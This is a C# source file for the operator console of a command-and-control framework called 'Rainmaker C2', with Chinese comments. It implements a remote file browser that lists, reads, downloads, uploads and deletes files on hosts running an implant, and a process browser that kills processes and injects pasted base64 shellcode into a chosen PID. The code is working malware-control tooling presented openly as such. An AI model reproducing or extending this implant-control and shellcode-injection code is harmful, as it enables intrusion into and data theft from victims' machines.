            return os.Contains("linux") || os.Contains("ubuntu") || os.Contains("debian")
                || os.Contains("centos") || os.Contains("red hat") || os.Contains("rhel")
                || os.Contains("fedora") || os.Contains("alpine") || os.Contains("kali")
                || os.Contains("suse") || os.Contains("arch") || os.Contains("rocky")
                || os.Contains("darwin") || os.Contains("mac") || os.Contains("os x")
                || os.Contains("bsd") || os.Contains("unix");
        }

        /// <summary>
        /// 当前文件浏览会话是不是 POSIX 目标 (Linux / macOS)。
        ///
        /// 判错的后果很直接: 路径分隔符会反掉 —— Linux 上 <c>/etc</c> 被规范化成 <c>\etc</c>
        /// 再发给植入体, 目标机根本没有这个路径, 报"无法枚举目录"; 同时根路径会回落成
        /// <c>C:\</c>, 出现"Linux 会话里自动去查 C 盘"这种结果。
        /// 判定不出时按 Windows 处理 (与历史行为一致, 不会让 Windows 会话回归)。
        /// </summary>
        private bool CurrentPathIsPosix()
        {
            var row = FsSessionRow();
            if (row == null) return false;
            return OsIsPosix(row.Os);
        }

        /// <summary>该平台的根路径 (路径框清空或首次进入时的落点)。</summary>
        private static string RootFor(bool posix) { return posix ? "/" : "C:\\"; }

        /// <summary>
        /// 枚举一个路径并填表。**命中缓存时零网络往返**, 这是"双击目录瞬间进去"的来源。
        /// <paramref name="pushNotice"/> 为 true 时把提示写进 FsHint;
        /// <paramref name="forceNetwork"/> 为 true 时跳过缓存强制重取 (刷新按钮用)。
        /// </summary>
        private async Task ListPathAsync(string sid, string path, bool pushNotice, bool forceNetwork = false)
        {
            bool posix = CurrentPathIsPosix();      // 必须在 await 之前取: 之后 UI 状态可能已变
            string p = NativeParse.NormRemote(path, posix);
            if (p.Length == 0) p = RootFor(posix);

            // 缓存命中: 直接填表返回, 一个网络请求都不发。
            // 对照原版 CS 的 Files.gotof → node.hasCache() → result(null, node.getCache())。
            List<FsItem> cached;
            if (!forceNetwork && _fsCache.TryGetValue(p, out cached))
            {
                ApplyFsList(cached, p, posix, pushNotice, true);
                return;
            }

            // 用"首帧确认"模式: 拿到输出后 120ms 内没有新帧就返回, 不再等 400ms 长静默。
            // 这样文件浏览的填表时机与终端显示基本同步。
            var r = await SendWaitAsync(sid, "ls " + p, false, 5000, FsFirstOutputMs);
            if (!r.Ok)
            {
                if (pushNotice) FsHint.Text = "枚举 " + p + " 失败: " + r.Error;
                SetStatus("文件枚举失败: " + r.Error);
                return;
            }

            var items = NativeParse.FileList(r.Raw);
            CacheFs(p, items);
            ApplyFsList(items, p, posix, pushNotice, false);
        }

        /// <summary>把一批 ls 结果填进表格 (缓存与网络两条路径共用)。</summary>
        private void ApplyFsList(List<FsItem> items, string p, bool posix, bool pushNotice, bool fromCache)
        {
            Sync(_fsItems, items);
            _pathInput = p;
            FsPath.Text = p;
            FsCount.Text = _fsItems.Count + " 项";

            int nDir = 0, nFile = 0, nRaw = 0;
            foreach (FsItem it in _fsItems)
            {
                if (it.Raw) nRaw++;
                else if (it.IsDir) nDir++;
                else nFile++;
            }
            // 缓存命中时不写终端: 同一个目录来回进出会把终端刷满, 而这里没有任何新信息。
            if (!fromCache)
            {
                AppendTermRaw(string.Format("[*] ls {0}  ->  {1} 目录 / {2} 文件 / {3} 原始行\r\n",
                                            p, nDir, nFile, nRaw));
            }

            bool any = nDir + nFile > 0;

            if (pushNotice || !any)
            {
                if (!any && _fsItems.Count > 0)
                {
                    // 典型场景: 目标是文件而不是目录 —— 植入体对无通配符路径回传纯文本。
                    // 同一路径只提示一次, 避免每次刷新都刷屏。
                    if (!_fsPlainHinted || pushNotice)
                    {
                        string wild = posix
                                    ? (p == "/" ? "/*" : p.TrimEnd('/') + "/*")
                                    : p.TrimEnd('\\') + "\\*";
                        FsHint.Text = "植入体未返回结构化列表 (" + _fsItems.Count + " 行原始文本, 见下表/终端)。"
                                      + "常见原因: ① 该路径是文件而不是目录; ② 目录不存在或无权限; "
                                      + "③ 想要结构化结果可改用通配符, 例如 ls " + wild;
                        _fsPlainHinted = true;
                    }
                }
                else
                {
                    FsHint.Text = "已枚举 " + p + "  共 " + _fsItems.Count + " 项。"
                                  + "双击目录进入 (进过的目录走本地缓存, 不再下发命令), 双击文件下载; "
                                  + "右键可下载 / 读取 / 删除 / 新建 / 复制路径。";
                }
            }
            SetStatus((fromCache ? "已从缓存显示: " : "文件列表已刷新: ") + p + "  共 " + _fsItems.Count + " 项");
        }

        /// <summary>写目录缓存并做简单 LRU 淘汰 (只保留最近 FsCacheMax 个目录)。</summary>
        private void CacheFs(string p, List<FsItem> items)
        {
            if (items == null || p.Length == 0) return;
            if (!_fsCache.ContainsKey(p))
            {
                _fsCacheOrder.Add(p);
                while (_fsCacheOrder.Count > FsCacheMax)
                {
                    string oldest = _fsCacheOrder[0];
                    _fsCacheOrder.RemoveAt(0);
                    _fsCache.Remove(oldest);
                }
            }
            _fsCache[p] = items;
        }

        /// <summary>清空目录缓存。会话切换或断开时必须调 —— 路径语义与目录内容都可能完全不同。</summary>
        private void ClearFsCache()
        {
            _fsCache.Clear();
            _fsCacheOrder.Clear();
        }

        /// <summary>
        /// 让某个目录的缓存失效。**任何改动性操作之后都必须调** (mkdir / rm / 上传),
        /// 否则列表一直显示改动前的旧内容 —— 这正是"命令明明执行完了, 文件浏览却没变"
        /// 的来源: 缓存把新结果挡在外面了。
        /// </summary>
        private void InvalidateFs(string p)
        {
            if (p.Length == 0) return;
            _fsCache.Remove(p);
            _fsCacheOrder.Remove(p);
        }

        private async void FsPath_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.Key != Key.Enter) return;
            e.Handled = true;
            var row = FsSessionRow();
            if (row == null || DataBusyGuard()) return;
            await ListPathAsync(row.Sid, FsPath.Text, true);
        }

        private async void FsUp_Click(object sender, RoutedEventArgs e)
        {
            var row = FsSessionRow();
            if (row == null || DataBusyGuard()) return;
            if (_pathInput.Length == 0) { FsHint.Text = "还没有路径, 请先刷新一次"; return; }
            string parent = NativeParse.ParentRemote(_pathInput, CurrentPathIsPosix());
            if (string.Equals(parent, _pathInput, StringComparison.OrdinalIgnoreCase))
            {
                FsHint.Text = "已在根目录: " + _pathInput;
                return;
            }
            await ListPathAsync(row.Sid, parent, true);
        }

        private async void FsRefresh_Click(object sender, RoutedEventArgs e)
        {
            var row = FsSessionRow();
            if (row == null || DataBusyGuard()) return;
            if (_pathInput.Length == 0) { await EnterSessionRootAsync(row); return; }
            // 刷新按钮 = 强制重取, 跳过目录缓存 (对应 CS 的 "Refresh" 菜单项)
            await ListPathAsync(row.Sid, _pathInput, true, true);
        }

        private async void GridFs_MouseDoubleClick(object sender, MouseButtonEventArgs e)
        {
            var row = FsSessionRow();
            if (row == null || DataBusyGuard()) return;
            var it = GridFs.SelectedItem as FsItem;
            if (it == null) return;
            if (it.Raw)
            {
                FsHint.Text = "该行是植入体回传的原始文本, 不是文件条目: " + it.Name;
                return;
            }
            _fsPlainHinted = false;
            if (it.IsDir) await ListPathAsync(row.Sid, NativeParse.JoinRemote(_pathInput, it.Name, CurrentPathIsPosix()), true);
            else await DownloadRemoteAsync(row.Sid, NativeParse.JoinRemote(_pathInput, it.Name, CurrentPathIsPosix()));
        }

        private void GridFs_PreviewMouseRightButtonDown(object sender, MouseButtonEventArgs e)
        {
            var dr = FindAncestor<DataGridRow>(e.OriginalSource as DependencyObject);
            if (dr != null) dr.IsSelected = true;
        }

        private async void FsCtxOpen_Click(object sender, RoutedEventArgs e)
        {
            var row = FsSessionRow();
            if (row == null || DataBusyGuard()) return;
            var it = GridFs.SelectedItem as FsItem;
            if (it == null) { SetStatus("请先选择一行"); return; }
            if (it.Raw) { FsHint.Text = "原始文本行不可操作: " + it.Name; return; }
            _fsPlainHinted = false;
            if (it.IsDir) await ListPathAsync(row.Sid, NativeParse.JoinRemote(_pathInput, it.Name, CurrentPathIsPosix()), true);
            else await DownloadRemoteAsync(row.Sid, NativeParse.JoinRemote(_pathInput, it.Name, CurrentPathIsPosix()));
        }

        private async void FsCtxCat_Click(object sender, RoutedEventArgs e)
        {
            var row = FsSessionRow();
            if (row == null || DataBusyGuard()) return;
            string full = FsSelPath();
            if (full.Length == 0)
            {
                // 允许对目录也执行 cat (植入体会回传错误文本, 但对特殊文件名有用)
                full = FsSelPathAllowDir();
                if (full.Length == 0) { SetStatus("请先选择一行文件条目"); return; }
            }
            await CatRemoteAsync(row.Sid, full);
        }

        private string FsSelPathAllowDir()
        {
            var it = GridFs.SelectedItem as FsItem;
            if (it == null || it.Raw) return "";
            return NativeParse.JoinRemote(_pathInput, it.Name, CurrentPathIsPosix());
        }

        private async Task CatRemoteAsync(string sid, string full)
        {
            var r = await SendWaitAsync(sid, "cat " + full, false);
            if (!r.Ok)
            {
                FsHint.Text = "cat " + full + " 未收到回传: " + r.Error;
                SetStatus("读取内容失败: " + r.Error);
                return;
            }
            ShowTextWindow("cat " + full, r.Raw);
            FsHint.Text = "已读取 " + full + " (" + r.Bytes + " 字节, 大文件在植入体侧会被截断)";
            SetStatus("已读取 " + full);
        }

        private async void FsCtxDownload_Click(object sender, RoutedEventArgs e)
        {
            var row = FsSessionRow();
            if (row == null || DataBusyGuard()) return;
            string full = FsSelPath();
            if (full.Length == 0) { SetStatus("请先选择一个文件条目"); return; }
            await DownloadRemoteAsync(row.Sid, full);
        }

        private async void FsDownload_Click(object sender, RoutedEventArgs e)
        {
            var row = FsSessionRow();
            if (row == null || DataBusyGuard()) return;
            string full = FsSelPath();
            if (full.Length == 0) { SetStatus("请先选择一个文件条目 (目录不能下载)"); return; }
            await DownloadRemoteAsync(row.Sid, full);
        }

        /// <summary>下发 download 并短暂轮询下载库, 命中后给出本地路径。</summary>
        private async Task DownloadRemoteAsync(string sid, string full)
        {
            var r = await SendWaitAsync(sid, "download " + full, false);
            if (!r.Ok)
            {
                FsHint.Text = "download " + full + " 未收到回传: " + r.Error;
                SetStatus("下载下发失败: " + r.Error);
                return;
            }

            string name = full;
            int cut = full.LastIndexOfAny(new char[] { '\\', '/' });
            if (cut >= 0 && cut + 1 < full.Length) name = full.Substring(cut + 1);

            SetStatus("已下发下载 " + full + " , 正在等待文件落地 ...");
            FsHint.Text = "正在等待 " + name + " 落地 (最多 12 秒)。文件较大时会走分块传输, 稍后在「下载」页可见。";

            DownloadRow hit = await WaitForDownloadAsync(sid, name, 12000);
            if (hit == null)
            {
                FsHint.Text = "下载 " + name + " 已在植入体侧启动, 但 12 秒内未出现在下载库。"
                              + "大文件分块传输会慢一些, 请稍后到「下载」页刷新查看。";
                SetStatus("下载未在 12 秒内落地: " + name + " (可能仍在分块传输)");
                return;
            }
            FsHint.Text = "下载完成: " + hit.Name + "  " + hit.SizeText + "  ->  " + hit.Path;
            SetStatus("下载完成: " + hit.Path + "  " + hit.SizeText);
        }

        private async Task<DownloadRow> WaitForDownloadAsync(string sid, string name, int budgetMs)
        {
            var sw = Stopwatch.StartNew();
            while (sw.ElapsedMilliseconds < budgetMs)
            {
                await Task.Delay(500);
                if (_waitAborted) return null;
                DownloadRow hit = FindDownload(sid, name);
                if (hit != null) return hit;
                try { await PollAsync(); } catch { }
                hit = FindDownload(sid, name);
                if (hit != null) return hit;
            }
            return null;
        }

        private DownloadRow FindDownload(string sid, string name)
        {
            for (int i = _downloads.Count - 1; i >= 0; i--)
            {
                DownloadRow d = _downloads[i];
                if (!string.Equals(d.Name, name, StringComparison.OrdinalIgnoreCase)) continue;
                if (sid.Length > 0 && d.Sid.Length > 0
                    && !string.Equals(d.Sid, sid, StringComparison.OrdinalIgnoreCase)) continue;
                return d;
            }
            return null;
        }

        private async void FsCtxMkdir_Click(object sender, RoutedEventArgs e)
        {
            var row = FsSessionRow();
            if (row == null || DataBusyGuard()) return;
            string name = PromptText("新建目录", "在 " + (_pathInput.Length > 0 ? _pathInput : "当前目录")
                                                + " 下新建目录, 请输入目录名 (可含相对路径):", "");
            if (name.Length == 0) return;

            string full = NativeParse.JoinRemote(_pathInput, name, CurrentPathIsPosix());
            var r = await SendWaitAsync(row.Sid, "mkdir " + full, true, 2500, FsFirstOutputMs);
            if (!r.Ok)
            {
                FsHint.Text = "mkdir " + full + " 未收到回传: " + r.Error;
                SetStatus("新建目录失败: " + r.Error);
                return;
            }
            FsHint.Text = "mkdir " + full + "  植端回传: " + Flatten(r.Raw);
            SetStatus("mkdir 已下发: " + full);
            // 目录内容已变: 必须作废缓存并强制重取, 否则列表还显示旧的
            InvalidateFs(_pathInput);
            await ListPathAsync(row.Sid, _pathInput, false, true);
        }

        private async void FsCtxRm_Click(object sender, RoutedEventArgs e)
        {
            var row = FsSessionRow();
            if (row == null || DataBusyGuard()) return;
            var it = GridFs.SelectedItem as FsItem;
            string full = FsSelPathAllowDir();
            if (full.Length == 0) { SetStatus("请先选择一行文件条目"); return; }

            bool isDir = it != null && it.IsDir;
            var ans = MessageBox.Show(this,
                (isDir ? "删除目录 (植入体用 DeleteFileA, 目录会失败): " : "删除文件: ") + full + "\n\n"
                + "该操作不可撤销。",
                "Rainmaker C2 控制台  二次确认", MessageBoxButton.OKCancel, MessageBoxImage.Warning);
            if (ans != MessageBoxResult.OK) { SetStatus("已取消删除"); return; }

            var r = await SendWaitAsync(row.Sid, "rm " + full, true, 2500, FsFirstOutputMs);
            if (!r.Ok)
            {
                FsHint.Text = "rm " + full + " 未收到回传: " + r.Error;
                SetStatus("删除失败: " + r.Error);
                return;
            }
            FsHint.Text = "rm " + full + "  植端回传: " + Flatten(r.Raw);
            SetStatus("rm 已下发: " + full + "  (" + Flatten(r.Raw) + ")");
            InvalidateFs(_pathInput);      // 同上: 删除后必须强制重取
            await ListPathAsync(row.Sid, _pathInput, false, true);
        }

        private void FsCtxCopyPath_Click(object sender, RoutedEventArgs e)
        {
            string full = FsSelPathAllowDir();
            if (full.Length == 0) { SetStatus("请先选择一行条目"); return; }
            CopyToClipboard(full, "完整路径");
        }

        private void FsCtxCopyName_Click(object sender, RoutedEventArgs e)
        {
            var it = GridFs.SelectedItem as FsItem;
            if (it == null) { SetStatus("请先选择一行"); return; }
            CopyToClipboard(it.Name, "文件名");
        }

        private async void FsUpload_Click(object sender, RoutedEventArgs e)
        {
            var row = FsSessionRow();
            if (row == null || DataBusyGuard()) return;

            var dlg = new Microsoft.Win32.OpenFileDialog();
            dlg.Title = "选择要上传到远端会话的本地文件";
            dlg.Filter = "全部文件 (*.*)|*.*";
            dlg.CheckFileExists = true;
            if (dlg.ShowDialog(this) != true) return;

            string local = dlg.FileName;
            string remote = NativeParse.JoinRemote(_pathInput, System.IO.Path.GetFileName(local), CurrentPathIsPosix());

            // 服务端 v2SendUpload 用 strings.Fields 切分命令行, 路径含空格会被切碎
            if (local.IndexOf(' ') >= 0 || remote.IndexOf(' ') >= 0)
            {
                var ans = MessageBox.Show(this,
                    "本地路径或远端路径包含空格:\n" + local + "\n" + remote + "\n\n"
                    + "服务端 v2SendUpload 以空格切分命令行 (strings.Fields), 含空格的路径会被切成多段, "
                    + "上传必然失败。仍要下发吗?",
                    "Rainmaker C2 控制台  路径含空格", MessageBoxButton.OKCancel, MessageBoxImage.Warning);
                if (ans != MessageBoxResult.OK) { SetStatus("已取消上传 (路径含空格)"); return; }
            }

            SetStatus("正在下发 upload " + local + " -> " + remote + " ...");
            var r = await SendWaitAsync(row.Sid, "upload " + local + " " + remote, false);
            if (!r.Ok)
            {
                FsHint.Text = "upload 未收到回传: " + r.Error + "  (命令已下发, 回传可能迟到)";
                SetStatus("上传下发失败: " + r.Error);
                return;
            }
            FsHint.Text = "upload 已下发: " + local + " -> " + remote + "  植端回传: " + Flatten(r.Raw);
            SetStatus("上传已下发: " + remote);
            InvalidateFs(_pathInput);      // 同上: 上传完成后目录里多了文件
            await ListPathAsync(row.Sid, _pathInput, false, true);
        }

        private static string Flatten(string s)
        {
            string t = Codec.Clean(s ?? "").Replace("\n", " ").Trim();
            if (t.Length > 160) t = t.Substring(0, 160) + " ...";
            return t.Length == 0 ? "(空回传)" : t;
        }

        // ------------------------------------------------------------ 进程浏览器

        private SessionRow ProcSessionRow()
        {
            var row = CurrentSessionRow();
            if (row == null)
            {
                SetStatus("请先在「会话」页选择一行会话");
                ProcHint.Text = "未选择会话: 进程浏览器的所有操作都针对当前选中会话。";
                return null;
            }
            if (!row.IsV2)
            {
                ProcHint.Text = "会话 " + row.Sid + " 是 " + row.Proto + " (legacy) 会话: 服务端把 ps 透传给 cmd, "
                                + "回传的是 tasklist 风格文本表格, 不是「PID TAB PPID TAB 线程数 TAB 名称」。"
                                + "本视图不填表; 命令仍会下发到会话终端。";
                SetStatus("进程浏览器不支持 " + row.Proto + " 会话的原生 ps 输出");
                return null;
            }
            if (string.IsNullOrEmpty(_curSid))
            {
                SetStatus("请先双击会话行把它设为当前会话");
                return null;
            }
            return row;
        }

        /// <summary>解析 ps 输出并按行填表, 同时标注当前会话自身进程。</summary>
        private void ApplyProcRows(string sid, string raw)
        {
            var items = NativeParse.ProcList(raw);
            long selfPid = 0;
            foreach (SessionRow s in _sessions)
            {
                if (string.Equals(s.Sid, sid, StringComparison.Ordinal)) { selfPid = s.Pid; break; }
            }
            foreach (ProcItem it in items) it.Self = (!it.Raw && selfPid > 0 && it.Pid == selfPid);

            Sync(_procItems, items);
            ProcSortApply();
            ProcCount.Text = _procItems.Count + " 项";
        }

        private async Task RefreshProcAsync(bool initial)
        {
            var row = CurrentSessionRow();
            if (row == null || !row.IsV2)
            {
                ProcSessionRow();
                return;
            }
            _procSid = row.Sid;
            ProcSession.Text = "会话 " + row.Sid + "  " + row.User + "@" + row.Host
                               + "  proto=" + row.Proto + "  自身 pid=" + row.PidText;
            if (initial) ProcHint.Text = "正在读取进程列表 (ps) ...";

            var r = await SendWaitAsync(row.Sid, "ps", false);
            if (!r.Ok)
            {
                ProcHint.Text = "ps 未收到回传: " + r.Error;
                SetStatus("进程列表刷新失败: " + r.Error);
                return;
            }
            ApplyProcRows(row.Sid, r.Raw);

            int nReal = 0, nRaw = 0;
            foreach (ProcItem it in _procItems) { if (it.Raw) nRaw++; else nReal++; }
            AppendTermRaw(string.Format("[*] ps  ->  {0} 个进程 / {1} 原始行 (本会话 pid 已标注)\r\n",
                                        nReal, nRaw));

            bool any = nReal > 0;
            if (!any && _procItems.Count > 0)
                ProcHint.Text = "ps 回传 " + _procItems.Count + " 行, 但没有一行是「PID TAB PPID TAB 线程数 TAB 名称」格式, "
                                + "已按原始文本展示 (见下表与会话终端)。";
            else
                ProcHint.Text = "已刷新 " + _procItems.Count + " 个进程 (橙色行 = 当前会话自身进程)。"
                                + "右键可结束进程 / 注入 shellcode / 复制 PID。";
            SetStatus("进程列表已刷新: " + _procItems.Count + " 项");
        }

        private async void ProcRefresh_Click(object sender, RoutedEventArgs e)
        {
            if (DataBusyGuard()) return;
            await RefreshProcAsync(true);
        }

        private void ProcFilter_TextChanged(object sender, TextChangedEventArgs e)
        {
            var view = System.Windows.Data.CollectionViewSource.GetDefaultView(GridProc.ItemsSource);
            if (view == null) return;
            string q = (ProcFilter.Text ?? "").Trim();
            if (q.Length == 0)
            {
                view.Filter = null;
            }
            else
            {
                view.Filter = delegate(object o)
                {
                    var it = o as ProcItem;
                    if (it == null) return false;
                    if (it.Raw) return it.Name.IndexOf(q, StringComparison.OrdinalIgnoreCase) >= 0;
                    if (it.Pid.ToString().IndexOf(q, StringComparison.Ordinal) >= 0) return true;
                    if (it.Name.IndexOf(q, StringComparison.OrdinalIgnoreCase) >= 0) return true;
                    return false;
                };
            }
            ProcCount.Text = CountProcVisible() + " / " + _procItems.Count + " 项";
        }

        private int CountProcVisible()
        {
            var view = System.Windows.Data.CollectionViewSource.GetDefaultView(GridProc.ItemsSource);
            if (view == null) return _procItems.Count;
            int n = 0;
            var en = view.GetEnumerator();
            while (en.MoveNext()) n++;
            return n;
        }

        private void ProcFilterClear_Click(object sender, RoutedEventArgs e)
        {
            ProcFilter.Text = "";
        }

        private void ProcSortApply()
        {
            var view = System.Windows.Data.CollectionViewSource.GetDefaultView(_procItems);
            if (view == null) return;
            foreach (System.ComponentModel.SortDescription d in view.SortDescriptions)
            {
                if (d.Direction == System.ComponentModel.ListSortDirection.Ascending)
                    view.SortDescriptions.Clear();
                break;
            }
            view.Refresh();
        }

        private void ProcSortReset_Click(object sender, RoutedEventArgs e)
        {
            var view = System.Windows.Data.CollectionViewSource.GetDefaultView(_procItems);
            if (view != null) view.SortDescriptions.Clear();
            ProcSortApply();
            SetStatus("已清除列排序, 恢复植入体回传顺序");
        }

        private void GridProc_PreviewMouseRightButtonDown(object sender, MouseButtonEventArgs e)
        {
            var dr = FindAncestor<DataGridRow>(e.OriginalSource as DependencyObject);
            if (dr != null) dr.IsSelected = true;
        }

        private ProcItem ProcTarget()
        {
            var it = GridProc.SelectedItem as ProcItem;
            if (it == null) { SetStatus("请先选择一行进程"); return null; }
            if (it.Raw) { SetStatus("该行是原始文本行, 不携带 PID, 无法作为操作目标"); return null; }
            return it;
        }

        private async void ProcCtxKill_Click(object sender, RoutedEventArgs e)
        {
            var row = ProcSessionRow();
            if (row == null || DataBusyGuard()) return;
            var it = ProcTarget();
            if (it == null) return;

            string cmd = NativeParse.KillProcCmd(row.IsV2, it.Pid);
            var ans = MessageBox.Show(this,
                "结束进程 " + it.Name + " (PID " + it.Pid + ", PPID " + it.Ppid + ")?\n\n"
                + "将下发: " + cmd + "\n\n"
                + (row.IsV2
                    ? "说明: 服务端把「kill <参数>」判给了 KILL/退出类别 (go/v2_core.go 的 v2Route), "
                      + "即 kill <pid> 会让植入体自身退出而不是结束目标进程, 因此这里改用 shell 通道的 taskkill。\n"
                      + "注意: 若目标正是当前会话自身进程, 会话将随之中断。"
                    : "说明: v1 会话走服务端别名映射 kill -> taskkill /F /PID。"),
                "Rainmaker C2 控制台  二次确认", MessageBoxButton.OKCancel, MessageBoxImage.Warning);
            if (ans != MessageBoxResult.OK) { SetStatus("已取消结束进程"); return; }

            var r = await SendWaitAsync(row.Sid, cmd, false);
            if (!r.Ok)
            {
                ProcHint.Text = cmd + " 未收到回传: " + r.Error;
                SetStatus("结束进程失败: " + r.Error);
                return;
            }
            ProcHint.Text = cmd + "  植端回传: " + Flatten(r.Raw);
            SetStatus("结束进程已下发: " + cmd);
            await RefreshProcAsync(false);
        }

        private async void ProcCtxInject_Click(object sender, RoutedEventArgs e)
        {
            var row = ProcSessionRow();
            if (row == null || DataBusyGuard()) return;
            var it = ProcTarget();
            if (it == null) return;

            string b64 = PromptText("注入 shellcode",
                "目标: " + it.Name + " (PID " + it.Pid + ")\n"
                + "支持 目标 PID  或  目标 PID:方法编号  (方法默认 1)。\n"
                + "下面粘贴 shellcode 的 base64 (可含换行/空格, 会自动压缩):", "");
            if (b64.Length == 0) return;

            long pid = it.Pid;
            int ci = b64.IndexOf(':');
            if (ci > 0)
            {
                string head = b64.Substring(0, ci).Trim();
                long p2;
                if (long.TryParse(head, out p2) && p2 > 0)
                {
                    pid = p2;
                    b64 = b64.Substring(ci + 1);
                }
            }

            string err;
            string cmd = NativeParse.InjectCmd(pid, b64, out err);
            if (cmd.Length == 0) { SetStatus("inject 参数无效: " + err); return; }

            if (cmd.Length > 4000)
            {
                var ans = MessageBox.Show(this,
                    "命令行长度 " + cmd.Length + " 字符。植入体命令通道能承受, 但该命令会在服务端日志与终端中变得很长。\n\n继续下发?",
                    "Rainmaker C2 控制台  shellcode 较长", MessageBoxButton.OKCancel, MessageBoxImage.Warning);
                if (ans != MessageBoxResult.OK) { SetStatus("已取消注入"); return; }
            }

            SetStatus("正在下发 inject -> PID " + pid + " (base64 " + (cmd.Length - ("inject " + pid + " ").Length) + " 字符) ...");
            var r = await SendWaitAsync(row.Sid, cmd, false);
            if (!r.Ok)
            {
                ProcHint.Text = "inject PID " + pid + " 未收到回传: " + r.Error;
                SetStatus("注入下发失败: " + r.Error);
                return;
            }
            ProcHint.Text = "inject PID " + pid + "  植端回传: " + Flatten(r.Raw);
            SetStatus("注入已下发: PID " + pid);
        }

        private void ProcCtxCopyPid_Click(object sender, RoutedEventArgs e)
        {
            var it = ProcTarget();
            if (it == null) return;
            CopyToClipboard(it.Pid.ToString(), "PID");
        }

        private void ProcCtxCopyInfo_Click(object sender, RoutedEventArgs e)
        {
            var it = GridProc.SelectedItem as ProcItem;
            if (it == null) { SetStatus("请先选择一行"); return; }
            if (it.Raw) { CopyToClipboard(it.Name, "原始文本"); return; }
            CopyToClipboard("PID=" + it.Pid + "  PPID=" + it.Ppid + "  threads=" + it.Threads
                            + "  name=" + it.Name + (it.Self ? "  [本会话]" : ""), "进程信息");
        }

        // ------------------------------------------------------------ 通用小部件

        /// <summary>轻量输入框 (避免为两个小输入新增 XAML 窗口文件)。</summary>
        private string PromptText(string title, string message, string def)
        {
            var win = new Window();
            win.Title = title;
            win.Owner = this;
            win.Width = 560;
            win.Height = 230;
            win.WindowStartupLocation = WindowStartupLocation.CenterOwner;
            win.ResizeMode = ResizeMode.NoResize;
            win.Background = (Brush)FindResource("Bg");
            win.FontFamily = FontFamily;

            var root = new Grid();
            root.Margin = new Thickness(16, 14, 16, 14);
            root.RowDefinitions.Add(new RowDefinition { Height = GridLength.Auto });
            root.RowDefinitions.Add(new RowDefinition { Height = new GridLength(1, GridUnitType.Star) });
            root.RowDefinitions.Add(new RowDefinition { Height = GridLength.Auto });

            var msg = new TextBlock();
            msg.Text = message;
            msg.Foreground = (Brush)FindResource("Dim");
            msg.FontSize = 11.5;
            msg.TextWrapping = TextWrapping.Wrap;
            msg.Margin = new Thickness(0, 0, 0, 10);
            Grid.SetRow(msg, 0);
            root.Children.Add(msg);

            var box = new TextBox();
            box.Style = (Style)FindResource("Area");
            box.Text = def ?? "";
            box.AcceptsReturn = true;
            box.TextWrapping = TextWrapping.Wrap;
            box.VerticalScrollBarVisibility = ScrollBarVisibility.Auto;
            box.FontFamily = new FontFamily("Consolas");
            Grid.SetRow(box, 1);
            root.Children.Add(box);

            var bar = new StackPanel();
            bar.Orientation = Orientation.Horizontal;
            bar.HorizontalAlignment = HorizontalAlignment.Right;
            bar.Margin = new Thickness(0, 12, 0, 0);

            string result = null;
            var ok = new Button();
            ok.Content = "确定";
            ok.Style = (Style)FindResource("Primary");
            ok.MinWidth = 88;
            ok.Click += delegate { result = box.Text; win.DialogResult = true; };

            var cancel = new Button();
            cancel.Content = "取消";
            cancel.Style = (Style)FindResource("Ghost");
            cancel.MinWidth = 88;
            cancel.Margin = new Thickness(10, 0, 0, 0);
            cancel.Click += delegate { win.DialogResult = false; };

            bar.Children.Add(ok);
            bar.Children.Add(cancel);
            Grid.SetRow(bar, 2);
            root.Children.Add(bar);

            win.Content = root;
            win.Loaded += delegate { box.Focus(); box.CaretIndex = box.Text.Length; };
            if (win.ShowDialog() != true) return "";
            return (result ?? "").Trim();
        }

        /// <summary>只读文本窗口 (cat 的回传内容)。</summary>
        private void ShowTextWindow(string title, string body)
        {            var win = new Window();
            win.Title = "Rainmaker C2  " + title;
            win.Owner = this;
            win.Width = 860;
            win.Height = 620;
            win.WindowStartupLocation = WindowStartupLocation.CenterOwner;
            win.Background = (Brush)FindResource("Bg");
            win.FontFamily = FontFamily;

            var grid = new Grid();
            grid.Margin = new Thickness(14);
            grid.RowDefinitions.Add(new RowDefinition { Height = GridLength.Auto });
            grid.RowDefinitions.Add(new RowDefinition { Height = new GridLength(1, GridUnitType.Star) });
            grid.RowDefinitions.Add(new RowDefinition { Height = GridLength.Auto });

            var head = new TextBlock();
            head.Text = title;
            head.Foreground = (Brush)FindResource("Accent");
            head.FontFamily = new FontFamily("Consolas");
            head.FontSize = 12;
            head.Margin = new Thickness(0, 0, 0, 8);
            Grid.SetRow(head, 0);
            grid.Children.Add(head);

            var box = new TextBox();
            box.Style = (Style)FindResource("Area");
            box.IsReadOnly = true;
            box.AcceptsReturn = true;
            box.TextWrapping = TextWrapping.Wrap;
            box.FontFamily = new FontFamily("Consolas");
            box.VerticalScrollBarVisibility = ScrollBarVisibility.Auto;
            box.Text = body ?? "";
            box.IsTabStop = false;
            Grid.SetRow(box, 1);
            grid.Children.Add(box);

            var bar = new StackPanel();
            bar.Orientation = Orientation.Horizontal;
            bar.HorizontalAlignment = HorizontalAlignment.Right;
            bar.Margin = new Thickness(0, 10, 0, 0);

            var copy = new Button();
            copy.Content = "复制全部";
            copy.Style = (Style)FindResource("Ghost");
            copy.MinWidth = 96;
            copy.Click += delegate { CopyToClipboard(box.Text, "读取内容"); };

            var close = new Button();
            close.Content = "关闭";
            close.Style = (Style)FindResource("Primary");
            close.MinWidth = 96;
            close.Margin = new Thickness(10, 0, 0, 0);
            close.Click += delegate { win.Close(); };

            bar.Children.Add(copy);
            bar.Children.Add(close);
            Grid.SetRow(bar, 2);
            grid.Children.Add(bar);

            win.Content = grid;
            win.Show();
        }

        // ------------------------------------------------------------ 监听器 / 凭据 / 下载

        /// <summary>监听器页初始化: 新建入口是一颗按钮 (弹 ListenerDialog), 页面上只留一行说明。</summary>
        private void InitListenerView()
        {
            LsnCount.Text = "0 个";
            LsnKindHint.Text = "类型与地址都在对话框里选: "
                             + string.Join(" / ", ListenerParse.KindLabels)
                             + "；HTTP / HTTPS 运行期不支持 (服务端会回明确原因)";
            LsnKindHint.ToolTip = LsnKindHint.Text;
        }

        /// <summary>
        /// 把 listeners[] 解析成行集合 (纯解析, 不碰 UI)。
        ///
        /// 差分刷新由调用方 Sync 完成: id 作为行主键的一部分, 服务端补上 id 后
        /// 主键变化会让那一行被替换 (Sync 的 Insert/Remove 路径), 不会把两行混成一行。
        /// </summary>
        private List<ListenerRow> ParseListeners(JsonElement root)
        {
            var list = new List<ListenerRow>();
            var seen = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
            foreach (var el in root.Arr("listeners"))
            {
                var r = new ListenerRow();
                r.Name = el.Str("name");
